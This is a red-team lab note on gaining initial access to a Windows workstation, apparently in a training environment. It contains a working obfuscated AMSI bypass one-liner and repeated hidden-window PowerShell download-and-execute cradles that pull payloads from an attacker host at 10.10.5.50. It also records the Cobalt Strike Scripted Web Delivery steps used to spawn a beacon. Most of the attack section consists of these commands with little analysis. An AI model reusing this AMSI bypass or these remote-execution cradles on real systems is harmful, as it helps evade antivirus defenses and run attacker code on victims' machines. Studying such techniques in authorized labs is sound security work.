---
created_date: 28 September 2023
updated_date: 28 September 2023
type: Initial Access
---
##### Machine Information
```
IP Address: 10.10.123.101
Hostname:WKSTN-2
Operating System: 10.0.19044 N/A Build 19044
Exploit & Port: Guacomole initial access
Privilege Escalation: TBD
Credentials:

Path to Box:

Attacker Desktop
-> WKSTN-2
```
### High-Level Summary

A brief description of the attack chain with machine names, including the depth of compromise should be included here.

-------------
#### Testing for Windows Defender
```powershell
Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
```
![[Pasted image 20231102163055.png]]
Windows Defender exists on this machine

#### Simulated Initial Access
opened WKSTN-2 and ran amsi bypass in powershell session
```powershell
#obfuscated oneliner amsi bypass
$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
```
PowerShell command to close prompt after executing `beacon` executable
```powershell

powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/a'))"
```
PowerShell command to utilize [[Manual AMSI Bypass]]
```powershell
iex (new-object net.webclient).downloadstring("http://10.10.5.50:80/bypass"); iex (new-object net.webclient).downloadstring("http://10.10.5.50:80/a")
```

created `Scripted Web Delivery` in Cobalt Strike `Attacks -> Scripted Web Delivery (S) ->` with options below
![[Pasted image 20231102152004.png]]
hitting launch spit out powershell code below to spawn a beacon
```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/a'))"

powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/a'))"

#this one worked 
# TYPE: powershell IEX
IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/a'))
IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/b'))
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/b'))"
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/b'))"
```
copied/pasted powershell command in same powershell terminal that the amsi bypass occurred in to get initial access beacon.
![[Pasted image 20231102152216.png]]
